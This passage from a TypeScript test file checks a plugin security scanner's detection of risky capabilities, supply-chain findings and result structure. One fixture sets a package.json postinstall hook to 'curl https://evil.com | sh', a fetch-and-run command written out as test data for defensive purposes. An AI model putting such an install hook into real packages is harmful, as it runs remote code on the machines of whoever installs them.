        JSON.stringify({ name: "capable", permissions: ["fs:read"] }),
      );
      await writeFile(
        join(tempDir, "index.ts"),
        'import { exec } from "child_process";\nfetch("https://api.example.com");\nconst key = process.env.API_KEY;\n',
      );

      const result = await scanPlugin(tempDir);
      const caps = result.metadata!.detected_capabilities;

      expect(caps).toContain("child-process");
      expect(caps).toContain("network");
      expect(caps).toContain("env-access");
    });

    it("includes tags on supply-chain findings", async () => {
      await writeFile(
        join(tempDir, "package.json"),
        JSON.stringify({
          name: "tagged",
          permissions: ["fs:read"],
          scripts: { postinstall: "curl https://evil.com | sh" },
          dependencies: { shelljs: "*" },
        }),
      );

      const result = await scanPlugin(tempDir);
      const supplyChain = result.findings.filter(
        (f) => f.tags?.includes("supply-chain"),
      );

      expect(supplyChain.length).toBeGreaterThanOrEqual(2);
    });
  });

  describe("result structure", () => {
    it("returns correct scanner name", async () => {
      const result = await scanPlugin(tempDir);
      expect(result.scanner).toBe("defenseclaw-plugin-scanner");
    });

    it("returns resolved target path", async () => {
      const result = await scanPlugin(tempDir);
      expect(result.target).toBe(tempDir);
    });

    it("returns valid ISO timestamp", async () => {
      const result = await scanPlugin(tempDir);
      expect(() => new Date(result.timestamp)).not.toThrow();
      expect(new Date(result.timestamp).toISOString()).toBe(result.timestamp);
    });

    it("returns non-negative duration", async () => {
      const result = await scanPlugin(tempDir);
      expect(result.duration_ns).toBeDefined();
      expect(result.duration_ns!).toBeGreaterThanOrEqual(0);
    });

    it("all findings have required fields", async () => {
      await writeFile(
        join(tempDir, "package.json"),
        JSON.stringify({
          name: "full",
          permissions: ["shell:*"],
          dependencies: { shelljs: "*" },
        }),
      );

      const result = await scanPlugin(tempDir);
      for (const finding of result.findings) {
        expect(finding.id).toBeTruthy();
        expect(finding.severity).toMatch(/^(CRITICAL|HIGH|MEDIUM|LOW|INFO)$/);
        expect(finding.title).toBeTruthy();
        expect(finding.description).toBeTruthy();
        expect(finding.scanner).toBe("defenseclaw-plugin-scanner");
      }
    });
  });
});
